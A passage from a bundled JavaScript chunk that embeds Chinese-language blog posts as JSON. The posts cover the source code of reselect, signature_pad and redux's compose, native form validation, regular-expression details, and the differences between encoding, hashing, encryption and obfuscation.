createSelector</h3>\\n<p>reselect最主要函数</p>\\n<ol>\\n<li><p><code>createSelectorCreator</code>返回一个函数，称为<code>createSelector</code></p>\\n</li>\\n<li><p><code>createSelector</code>接受2类参数</p>\\n<p> <code>依赖数据函数</code>(可以有多个)</p>\\n<p> <code>数据处理函数</code>(必须放在参数的最后)：</p>\\n</li>\\n<li><p><code>createSelector</code>的内部操作</p>\\n<ol>\\n<li><p>对<code>依赖数据函数</code>和<code>数据处理函数</code>执行缓存函数</p>\\n</li>\\n<li><p>每次执行<code>createSelector</code>的时候，依次比较<code>依赖数据函数</code>和<code>数据处理函数</code>的缓存</p>\\n<p>这样处理就可以知道要想返回缓存的结果，必须要达到以下条件任一：</p>\\n<ol>\\n<li><code>依赖数据函数</code>的参数(一般为<code>store</code>)全等比较为true</li>\\n<li><code>依赖数据函数</code>的参数(一般为<code>store</code>)全等比较为false, <code>数据处理函数</code>的参数全等比较为true</li>\\n</ol>\\n</li>\\n</ol>\\n</li>\\n<li><p>返回<code>依赖数据函数</code></p>\\n<p> <a href=\\"https://codesandbox.io/s/jlpozpjprw\\">reselect使用例子</a></p>\\n</li>\\n</ol>\\n<hr>\\n<h3 id=\\"createstructuredselector\\">createStructuredSelector</h3>\\n<p>一个便利的函数，可以用于变更数据的key值，通过嵌套可以变更数据的结构</p>\\n<p>它的内部正是调用了<code>createSelector</code></p>\\n<ol>\\n<li><p>接受2个函数，分别为一个(参数1)对象，一个(参数2)<code>selectorCreator</code>(默认就是createSelector)</p>\\n</li>\\n<li><p>调用<code>createSelector</code>，将参数1(对象)的value值作为<code>依赖数据函数</code>，\\n其<code>数据处理函数</code>就是一个将参数1(对象)的key值和<code>依赖数据函数</code>的返回值组成一个新的对象的过程。</p>\\n<p> <a href=\\"https://codesandbox.io/s/53kvl30564\\">createStructuredSelector使用例子</a></p>\\n</li>\\n</ol>\\n<hr>\\n<p>注意点：</p>\\n<ol>\\n<li><p>缓存函数只能保存上一次缓存的值(单个)。</p>\\n</li>\\n<li><p>缓存函数是通过对比参数而进行判断的，因此必须保证所提供的<code>依赖数据函数</code>和<code>数据处理函数</code>都是纯函数，而且它只保存上一次函数。</p>\\n<p> <a href=\\"https://codesandbox.io/s/n6y126v2p\\">非纯函数例子</a></p>\\n</li>\\n<li><p>要想取消缓存，必须取消引用，包括<code>依赖数据函数</code>参数(store)的引用和内部<code>数据处理函数</code>的参数引用</p>\\n<p> <a href=\\"https://codesandbox.io/s/lx1kq3lj39\\">取消缓存例子</a></p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"reselect-yuan-ma-liang-dian-jie-shao","level":2,"text":"reselect源码亮点介绍"},{"anchor":"defaultmemoize","level":3,"text":"defaultMemoize"},{"anchor":"createselectorcreator-createselector","level":3,"text":"createSelectorCreator, createSelector"},{"anchor":"createstructuredselector","level":3,"text":"createStructuredSelector"}],"relatedTags":null,"created_at":"2018-07-13","timeArr":[2018,6,13,0,0,0,0],"title":"源码阅读-reselect源码学习","uuid":"2cf2373f2fa9c28ce15661630048ac1848d2530f","summary":"<h4>reselect源码亮点介绍</h4>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reselect/README.md\\">完整源码说明注释</a></p>\\n<p>导图：</p>\\n<p><img src=\\"/article/img/reselect.png\\" alt=\\"\\">\\n...</p>","slug":"yuan-ma-yue-du-reselect-yuan-ma-xue-xi","sha":"85d8aee7f13669499db1bd4d7c3233117665daea"}')},681:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p><a href=\\"https://github.com/szimek/signature_pad\\">signature_pad</a>一个基于Canvas的平滑手写画板工具</p>\\n</blockquote>\\n<hr>\\n<h4 id=\\"yi-xie-jie-shao\\">一些介绍</h4>\\n<p>实现手写有多种方式。</p>\\n<p>一种比较容易做出的是对鼠标移动轨迹画点，再将两点之间以<code>直线</code>相连，最后再进行平滑处理，这种方案不需要什么算法支持，但同样，它面对一个性能和美观的抉择，打的点多，密集，性能相对较低，但更加美观，视觉上更平滑；</p>\\n<p>此处用的另一种方案，画贝塞尔曲线。</p>\\n<p>由于<code>canvas</code>没有默认的画出贝塞尔曲线方法，因此曲线是通过不断画出<code>一个个点</code>形成的，那么问题来了，这些点谁来定？</p>\\n<p>这里使用了贝塞尔曲线的一系列算法，包括<code>求控制点</code>，<code>求长度</code>，<code>计算当前点的大小</code>，最后用<code>canvas</code>画出每一个确定位置的点。</p>\\n<h4 id=\\"can-shu-ji-pei-zhi-jie-shao\\">参数及配置介绍</h4>\\n<p>提供的可配置参数如下</p>\\n<pre><code><pre class=\\"hljs\\"><code>export interface IOptions {\\n  // 点的大小(不是线条)\\n  dotSize?: number | (() =&gt; number);\\n  // 最粗的线条宽度\\n  minWidth?: number;\\n  // 最细的线条宽度\\n  maxWidth?: number;\\n  // 最小间隔距离(这个距离用贝塞尔曲线填充)\\n  minDistance?: number;\\n  // 背景色\\n  backgroundColor?: string;\\n  // 笔颜色\\n  penColor?: string;\\n  // 节流的间隔\\n  throttle?: number;\\n  // 当前画笔速度的计算率，默认0.7，意思就是 当前速度=当前实际速度*0.7+上一次速度*0.3\\n  velocityFilterWeight?: number;\\n  // 初始回调\\n  onBegin?: (event: MouseEvent | Touch) =&gt; void;\\n  // 结束回调\\n  onEnd?: (event: MouseEvent | Touch) =&gt; void;\\n}</code></pre></code></pre><p>这里要注意的是并没有<code>线条粗细</code>这个选项，因为这里面的粗细不等线条都是通过一个个大小不同的点构造而成；</p>\\n<p><code>throttle</code>这个配置可以参考<code>loadsh</code>或者<code>underscore</code>的<code>_.throttle</code>，功能一致，就是为了提高性能。</p>\\n<h4 id=\\"zhu-ce-shi-jian\\">注册事件</h4>\\n<p>在<code>constructor</code>内部，除了配置传入的参数外，就是注册事件。</p>\\n<p>这里优先使用了<a href=\\"https://developer.mozilla.org/zh-CN/docs/Web/API/PointerEvent\\">PointerEvent</a>触点事件，<code>PointerEvent</code>可以说是触摸以及点击事件的一个统一，如果设备支持，不需要再分别为<code>mouse</code>和<code>touch</code>写两套事件了。</p>\\n<h4 id=\\"zhuang-tai-shu-ju-chu-cun\\">状态数据储存</h4>\\n<p>状态开关：</p>\\n<ul>\\n<li><p><code>this._mouseButtonDown</code></p>\\n<p>  当执行<code>move</code>事件时，会检查此状态，只有在<code>true</code>的情况下才会执行。</p>\\n</li>\\n</ul>\\n<p>数据储存分为2种格式：</p>\\n<ol>\\n<li><p><code>pointGroup</code></p>\\n<p> 这是当前笔画的点的一个集合，内部储存了当前笔画的颜色<code>color</code>和所有的点<code>points&lt;Array&gt;</code>。</p>\\n</li>\\n<li><p><code>this._data</code></p>\\n<p> 这是一个储存所有笔画的栈，格式为<code>[pointGroup, pointGroup, ..., pointGroup]</code>，当需要执行<code>undo</code>的时候，只需要删除<code>this._data</code>中的最后一条数据。</p>\\n</li>\\n</ol>\\n<h4 id=\\"shi-jian-liu-cheng-ji-fang-fa\\">事件流程及方法</h4>\\n<h5 id=\\"mousedown-shi-jian\\"><code>mouseDown</code>事件</h5>\\n<p>当鼠标(触点)按下时，改变状态<code>this._mouseButtonDown = true</code>，调用<code>onBegin</code>回调，创建当前笔画的一个新的集合，然后对<strong>当前点执行更新</strong>。</p>\\n<h5 id=\\"mousemove-shi-jian\\"><code>mouseMove</code>事件</h5>\\n<p>首先检查<code>this._mouseButtonDown</code>状态，对<strong>当前点执行更新</strong>。</p>\\n<h5 id=\\"mouseup-shi-jian\\"><code>mouseUp</code>事件</h5>\\n<p>改变状态<code>this._mouseButtonDown = false;</code>，调用<code>onEnd</code>回调，对<strong>当前点执行更新</strong>。</p>\\n<p>可以看到，上面的每一个事件内部都调用对当前点执行更新的方法。</p>\\n<h5 id=\\"dian-de-geng-xin-fang-fa-_strokeupdate\\">点的更新方法<code>_strokeUpdate</code></h5>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>private _strokeUpdate(event: MouseEvent | Touch): <span class=\\"hljs-keyword\\">void</span> {\\n    <span class=\\"hljs-comment\\">// 获取当前触点的位置</span>\\n    <span class=\\"hljs-keyword\\">const</span> x = event.clientX;\\n    <span class=\\"hljs-keyword\\">const</span> y = event.clientY;\\n\\n    <span class=\\"hljs-comment\\">// 创建点</span>\\n    <span class=\\"hljs-keyword\\">const</span> point = <span class=\\"hljs-keyword\\">this</span>._createPoint(x, y);\\n    <span class=\\"hljs-comment\\">// 调出最后一个点集</span>\\n    <span class=\\"hljs-keyword\\">const</span> lastPointGroup = <span class=\\"hljs-keyword\\">this</span>._data[<span class=\\"hljs-keyword\\">this</span>._data.length - <span class=\\"hljs-number\\">1</span>];\\n    <span class=\\"hljs-comment\\">// 获取最后一个点集的点的数组</span>\\n    <span class=\\"hljs-keyword\\">const</span> lastPoints = lastPointGroup.points;\\n    <span class=\\"hljs-comment\\">// 如果存在上一个点，获取上一个点</span>\\n    <span class=\\"hljs-keyword\\">const</span> lastPoint =\\n      lastPoints.length &gt; <span class=\\"hljs-number\\">0</span> &amp;&amp; lastPoints[lastPoints.length - <span class=\\"hljs-number\\">1</span>];\\n    <span class=\\"hljs-comment\\">// 判断上一个点到当前点是否太近(也就是小于配置的最小间隔距离)</span>\\n    <span class=\\"hljs-keyword\\">const</span> isLastPointTooClose = lastPoint\\n      ? point.distanceTo(lastPoint) &lt;= <span class=\\"hljs-keyword\\">this</span>.minDistance\\n      : <span class=\\"hljs-literal\\">false</span>;\\n    <span class=\\"hljs-comment\\">// 调出点集的颜色</span>\\n    <span class=\\"hljs-keyword\\">const</span> color = lastPointGroup.color;\\n\\n    <span class=\\"hljs-comment\\">// Skip this point if it\'s too close to the previous one</span>\\n    <span class=\\"hljs-comment\\">// 存在上一个点但是太近，跳过，其余的执行</span>\\n    <span class=\\"hljs-keyword\\">if</span> (!lastPoint || !(lastPoint &amp;&amp; isLastPointTooClose)) {\\n      <span class=\\"hljs-comment\\">// 向上一次的点数组中添加当前点，并且生成一个新的贝塞尔曲线实例</span>\\n      <span class=\\"hljs-comment\\">// 包括4个点 （初始点，2个控制点，结束点）</span>\\n      <span class=\\"hljs-comment\\">// 初始宽度，最终宽度</span>\\n      <span class=\\"hljs-keyword\\">const</span> curve = <span class=\\"hljs-keyword\\">this</span>._addPoint(point);\\n\\n      <span class=\\"hljs-comment\\">// 如果不存在lastPoint，即当前点是第一个点</span>\\n      <span class=\\"hljs-keyword\\">if</span> (!lastPoint) {\\n        <span class=\\"hljs-comment\\">// 画一个点</span>\\n        <span class=\\"hljs-keyword\\">this</span>._drawDot({ color, point });\\n      <span class=\\"hljs-comment\\">// 如果存在lastPoint 并且能形成一个贝塞尔曲线实例(3个点以上)</span>\\n      } <span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span> (curve) {\\n        <span class=\\"hljs-comment\\">// 画出参数中curve实例中两点之间的曲线</span>\\n        <span class=\\"hljs-keyword\\">this</span>._drawCurve({ color, curve });\\n      }\\n      <span class=\\"hljs-comment\\">// 添加到当前笔画的点数组</span>\\n      lastPoints.push({\\n        <span class=\\"hljs-attr\\">time</span>: point.time,\\n        <span class=\\"hljs-attr\\">x</span>: point.x,\\n        <span class=\\"hljs-attr\\">y</span>: point.y,\\n      });\\n    }\\n  }</code></pre></code></pre>\\n<p>这个方法前面就是一系列判断</p>\\n<ul>\\n<li><p>判断是否是第一个点</p>\\n</li>\\n<li><p>判断是否能加入点的集合(满足点的最小间隔)</p>\\n</li>\\n<li><p>判断是否能画出贝塞尔曲线(满足至少3个点)</p>\\n<p>  对于能画出贝塞尔曲线的点，执行算法，求出<code>Besier</code>实例，包括4个点<code>初始点</code>，<code>结束点</code>，<code>控制点1</code>，<code>控制点2</code>以及当前曲线中线条的的<code>初始宽度</code>和<code>结束宽度</code>。</p>\\n<p>  具体如何算的，请参考源码<code>src/bezier.ts</code>和<a href=\\"https://medium.com/square-corner-blog/smoother-signatures-be64515adb33\\">这篇文章</a>。</p>\\n</li>\\n</ul>\\n<p>对于能画出贝塞尔曲线的，对已经求出的<code>Bezier</code>实例，执行<code>this._drawCurve</code>，否则执行<code>this._drawDot</code></p>\\n<h5 id=\\"hua-dian-de-fang-fa-this_drawdot\\">画点的方法<code>this._drawDot</code></h5>\\n<p>获取配置中的<code>dotSize</code>，执行<code>canvas</code>画点。</p>\\n<h5 id=\\"hua-xian-de-fang-fa-this__drawcurve\\">画线的方法<code>this.__drawCurve</code></h5>\\n<ol>\\n<li><p>求出当前<code>Bezier</code>实例<code>初始点</code>和<code>结束点</code>之间的距离，这个距离不是直线距离，而是贝塞尔曲线距离。</p>\\n</li>\\n<li><p>对这个距离进行扩展，例如，计算得到距离为<code>50</code>，那就扩展为<code>100</code>个点，即我需要在<code>50</code>这个距离内画出<code>100</code>个点；</p>\\n<p> 这么做可以保证在正常或者稍微快速的书写中，不出现断层。</p>\\n</li>\\n<li><p>接着又是<a href=\\"https://medium.com/square-corner-blog/smoother-signatures-be64515adb33\\">算法</a>，目的是求出这个距离内的每一个点的大小，这是一个变化值，是的粗细变化更加平滑。</p>\\n</li>\\n<li><p>最后同样是<code>canvas</code>画点。</p>\\n</li>\\n</ol>\\n<p>以上就是整个基本流程。</p>\\n<h4 id=\\"zong-jie\\">总结</h4>\\n<p>阅读一遍后，这个库说白就是基础的事件操作+贝塞尔曲线算法，但是，它内部的代码格式非常清晰，<code>细粒度+代码复用</code>使得维护起来非常方便。</p>\\n<p>同时可以对贝塞尔曲线有一个更深层的了解(算法还是没法手撕囧)，但起码有一个比较完整的思路；</p>\\n<p>一些可以借鉴的东西：</p>\\n<ul>\\n<li><a href=\\"#%E6%B3%A8%E5%86%8C%E4%BA%8B%E4%BB%B6\\">PointerEvent的优势</a></li>\\n<li>canvas+贝塞尔曲线</li>\\n<li>节流<code>throttle</code>的写法(参考源码src/throttle.ts)</li>\\n<li><a href=\\"#%E7%8A%B6%E6%80%81%E6%95%B0%E6%8D%AE%E5%82%A8%E5%AD%98\\">数据结构及实现<code>undo</code>的方案</a></li>\\n</ul>\\n<blockquote>\\n<p>贝塞尔曲线算法资料：</p>\\n<ul>\\n<li><a href=\\"https://medium.com/square-corner-blog/smoother-signatures-be64515adb33\\">https://medium.com/square-corner-blog/smoother-signatures-be64515adb33</a></li>\\n<li><a href=\\"https://www.lemoda.net/maths/bezier-length/index.html\\">https://www.lemoda.net/maths/bezier-length/index.html</a></li>\\n</ul>\\n</blockquote>\\n<hr>\\n<blockquote>\\n<p><a href=\\"https://segmentfault.com/blog/souce-code\\"><strong>源码阅读专栏</strong></a>对一些中小型热门项目进行源码阅读和分析，对其整体做出导图，以便快速了解内部关系及执行顺序。\\n当前源码(带注释)，以及更多源码阅读内容：<a href=\\"https://github.com/stonehank/sourcecode-analysis\\">https://github.com/stonehank/sourcecode-analysis</a>，欢迎<code>fork</code>，求:star:</p>\\n</blockquote>\\n","toc":[{"anchor":"yi-xie-jie-shao","level":4,"text":"一些介绍"},{"anchor":"can-shu-ji-pei-zhi-jie-shao","level":4,"text":"参数及配置介绍"},{"anchor":"zhu-ce-shi-jian","level":4,"text":"注册事件"},{"anchor":"zhuang-tai-shu-ju-chu-cun","level":4,"text":"状态数据储存"},{"anchor":"shi-jian-liu-cheng-ji-fang-fa","level":4,"text":"事件流程及方法"},{"anchor":"mousedown-shi-jian","level":5,"text":"<code>mouseDown</code>事件"},{"anchor":"mousemove-shi-jian","level":5,"text":"<code>mouseMove</code>事件"},{"anchor":"mouseup-shi-jian","level":5,"text":"<code>mouseUp</code>事件"},{"anchor":"dian-de-geng-xin-fang-fa-_strokeupdate","level":5,"text":"点的更新方法<code>_strokeUpdate</code>"},{"anchor":"hua-dian-de-fang-fa-this_drawdot","level":5,"text":"画点的方法<code>this._drawDot</code>"},{"anchor":"hua-xian-de-fang-fa-this__drawcurve","level":5,"text":"画线的方法<code>this.__drawCurve</code>"},{"anchor":"zong-jie","level":4,"text":"总结"}],"relatedTags":null,"created_at":"2019-06-18","timeArr":[2019,5,18,0,0,0,0],"title":"源码阅读-signature_pad","uuid":"70c0ac44839743166637d895a36548085cbfc645","summary":"<p><a href=\\"https://github.com/szimek/signature_pad\\">signature_pad</a>一个基于Canvas的平滑手写画板工具</p>","slug":"yuan-ma-yue-du-signature_pad","sha":"feecc3d4a25186c780dc6453dc129b62bca69809"}')},682:function(n){n.exports=JSON.parse('{"content":"<p>先上源码：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 将(fun1,fun2,fun3)转换成fun1(fun2(fun3()))</span>\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">compose</span>(<span class=\\"hljs-params\\">...funcs</span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">0</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">arg</span> =&gt;</span> arg\\n  }\\n\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">1</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> funcs[<span class=\\"hljs-number\\">0</span>]\\n  }\\n  <span class=\\"hljs-comment\\">// 重点理解的一句 这里的reduce内部还返回了一个函数</span>\\n  <span class=\\"hljs-keyword\\">return</span> funcs.reduce(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a, b</span>) =&gt;</span> <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...args</span>) =&gt;</span> a(b(...args)))\\n}</code></pre></code></pre>\\n<p>重点看一句就够了：<code>return funcs.reduce((a, b) =&gt; (...args) =&gt; a(b(...args)))</code></p>\\n<p>现在我们先假设一个数组，有3个函数，分别是x,y,z</p>\\n<p>那么<code>compose([x,y,z])</code>发生什么了，接下来就一步一步解释</p>\\n<ol>\\n<li>变成reduce模式：<code>[x,y,z].reduce((a, b) =&gt; (...args) =&gt; a(b(...args)))</code></li>\\n<li>reduce第一次执行，a为x，b为y，reduce内部返回<code>(...args)=&gt;x(y(...args))</code></li>\\n<li>reduce第二次执行，因为会将上一次的返回值作为a，这次b为z，因此将z(...args)套进a的参数，变成：<code>(...args)=&gt;x(y(z(...args)))</code></li>\\n<li>执行结束，最后compose就返回了这么个东西<code>(...args)=&gt;x(y(z(...args)))</code></li>\\n</ol>\\n<p>因此，如果外部调用是这样的<code>compose(...)(一些参数)</code>，那么这里的参数将会套进上面返回值的<code>(...args)</code>，最终变成<code>x(y(z(一些参数)))</code></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-13","timeArr":[2018,5,13,0,0,0,0],"title":"源码阅读-学习redux的compose","uuid":"bc4cf19b8dcd0b9fd7c436d8de5961ecf9099175","summary":"<p>先上源码：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 将(fun1,fun2,fun3)转换成fun1(fun2(fun3()))</span>\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">compose</span>(<span class=\\"hljs-params\\">...funcs</span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">0</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">arg</span> =&gt;</span> arg\\n  }\\n\\n  <span class=\\"hljs-keyword\\">if</span> (f...</code></pre>","slug":"yuan-ma-yue-du-xue-xi-redux-de-compose","sha":"1c31d66483e93c9656f2d42ae1164c3b016501b8"}')},683:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"biao-dan-yan-zheng-yuan-sheng\\">表单验证原生</h2>\\n<ul>\\n<li><p>查看是否通过验证：\\n<code>ele.checkValidity</code></p>\\n</li>\\n<li><p>验证不通过的时候的提示（只读）：\\n<code>ele.validationMessage</code></p>\\n<p>  可以通过setCustomValidity修改，设为空字符串表示取消自定义提示，但要设定条件，否则默认不通过</p>\\n<p>  <code>ele.setCustomValidity(&quot;自定义报错内容&quot;)</code></p>\\n</li>\\n<li><p>查看是否在submit时进行验证（只读）：\\n<code>ele.willValidate</code> </p>\\n</li>\\n<li><p>不使用自带验证</p>\\n</li>\\n</ul>\\n<p><code>novalidate</code>用于&lt;form&gt;</p>\\n<p><code>formnovalidate</code>用于&lt;内部控件&gt;</p>\\n<p>参考:<a href=\\"https://wangdoc.com/javascript/bom/form.html\\">https://wangdoc.com/javascript/bom/form.html</a></p>\\n","toc":[{"anchor":"biao-dan-yan-zheng-yuan-sheng","level":2,"text":"表单验证原生"}],"relatedTags":null,"created_at":"2018-08-17","timeArr":[2018,7,17,0,0,0,0],"title":"原生表单验证相关","uuid":"bd9804a5d37884a5eff1d06717429f0517cd2782","summary":"<h4>表单验证原生</h4>\\n<ul>\\n<li>\\n<p>查看是否通过验证：\\n<code>ele.checkValidity</code></p>\\n</li>\\n<li>\\n<p>验证不通过的时候的提示（只读）：\\n<code>ele.validationMessage</code></p>\\n<p>可以通过setCustomValidity修改，设为空字符串表示取消自定义提示，但要设定条件，否则默认不通过</p>\\n<p>`ele.set...</p>\\n</li>\\n</ul>","slug":"yuan-sheng-biao-dan-yan-zheng-xiang-guan","sha":"9d6992f642b20f00a885c2f614ed58f5ff23a0e4"}')},684:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"zheng-ze--exec-he-match\\">正则 exec和match</h2>\\n<ul>\\n<li>都是返回数组，包括小括号内部</li>\\n<li>非全局 一致</li>\\n<li>match全局，匹配多个值</li>\\n<li>exec全局，匹配单个值，但每次执行会继续从上一次匹配数据之后开始<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> str=<span class=\\"hljs-string\\">\'this is a stick\'</span>\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>let reg=/.is/\\nreg.exec(str)   // [&quot;his&quot;, index: 1, input: &quot;this is a stick&quot;, groups: undefined]\\nreg.exec(str)   // [&quot;his&quot;, index: 1, input: &quot;this is a stick&quot;, groups: undefined]</p>\\n<p>let regG=/.is/g\\nregG.exec(str)  // [&quot;his&quot;, index: 1, input: &quot;this is a stick&quot;, groups: undefined]\\nregG.exec(str)  // [&quot; is&quot;, index: 4, input: &quot;this is a stick&quot;, groups: undefined]\\nregG.exec(str)  // null</p>\\n<pre><code><pre class=\\"hljs\\"><code>\\n## 正则的静态属性\\n\\n| 长属性名 | 短属性名 | 说明 |\\n| :------| :---: | :---- |\\n| input | $_ | 最近一次要匹配的字符串 |\\n| lastMatch | $&amp; | 最近一次匹配项 |\\n| lastParen | $+ | 最近一次匹配的捕获组 |\\n| leftContext | $` | input字符串中lastMatch之前的文本 |\\n| rightContext | $\' | input字符串中lastMatch之后的文本 |\\n| multiline | $* | 布尔值，表示是否所有表达式都使用多行模式|\\n\\n```js\\nlet str=&quot;short stick&quot;\\nlet pattern=/s/g\\n\\n// 第一次执行(也可以用exec)\\npattern.test(str)\\nRegExp.rightContext   // &quot;hort stick&quot;\\nRegExp[&quot;$\'&quot;]          // &quot;hort stick&quot;\\n\\n// 第二次执行\\npattern.test(str)\\nRegExp.rightContext   // &quot;tick&quot;\\nRegExp[&quot;$\'&quot;]          // &quot;tick&quot;</code></pre></code></pre>","toc":[{"anchor":"zheng-ze--exec-he-match","level":2,"text":"正则 exec和match"}],"relatedTags":null,"created_at":"2018-07-11","timeArr":[2018,6,11,0,0,0,0],"title":"正则遗漏点","uuid":"5fc1f9d14abff5f33e3b3a286fadfe82ad9a48b2","summary":"<h4>正则 exec和match</h4>\\n<ul>\\n<li>都是返回数组，包括小括号内部</li>\\n<li>非全局 一致</li>\\n<li>match全局，匹配多个值</li>\\n<li>exec全局，匹配单个值，但每次执行会继续从上一次匹配数据之后开始</li>\\n</ul>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> str=<span class=\\"hljs-string\\">\'this is a stick\'</span>\\n\\n<span class=\\"hljs-keyword\\">let</span> reg=<span class=\\"hljs-regexp\\">/.is/</span>\\nreg.exec(str)   /...</code></pre>","slug":"zheng-ze-yi-lou-dian","sha":"150a56b6eb7cd88a1e0662000a7a8f23e0c8003a"}')},685:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li><p>编码</p>\\n<p>  转换数据格式使其能被各种系统执行，算法公开</p>\\n</li>\\n<li><p>hash</p>\\n<p>  一个多对一的转换，不可逆，长度固定，用于检测文件是否有改动</p>\\n<p>  四个特性：</p>\\n<ol>\\n<li>输入相同，输出一定相同</li>\\n<li>绝大部分不同的输入不应该产生相同的输出</li>\\n<li>输入到输出行为不可逆</li>\\n<li>对输入值的修改会导致输出产生巨大的改变</li>\\n</ol>\\n</li>\\n<li><p>加密</p>\\n<p>  一个一对一的转换，可逆，长度不定，包括算法和密钥，如果知道算法不知道密钥还是非常难从密文转换到明文</p>\\n</li>\\n<li><p>混淆</p>\\n<p>  让文件难以理解，但能被计算机执行</p>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2018-07-04","timeArr":[2018,6,4,0,0,0,0],"title":"转码,Hash,加密,混淆区别总结","uuid":"c177754811a4f2e83d02b2906306ad34211a38a7","summary":"<ul>\\n<li>\\n<p>编码</p>\\n<p>转换数据格式使其能被各种系统执行，算法公开</p>\\n</li>\\n<li>\\n<p>hash</p>\\n<p>一个多对一的转换，不可逆，长度固定，用于检测文件是否有改动</p>\\n<p>四个特性：</p>\\n<ol>\\n<li>输入相同，输出一定相同</li>\\n<li>绝大部分不同的输入不应该产生相同的输出</li>\\n<li>输入到输出行为不可逆\\n4....</li>\\n</ol>\\n</li>\\n</ul>","slug":"zhuan-ma-Hash-jia-mi-hun-xiao-qu-bie-zong-jie","sha":"22a37b52e29256c6227488765b3c7bae7216c9d5"}')}}]);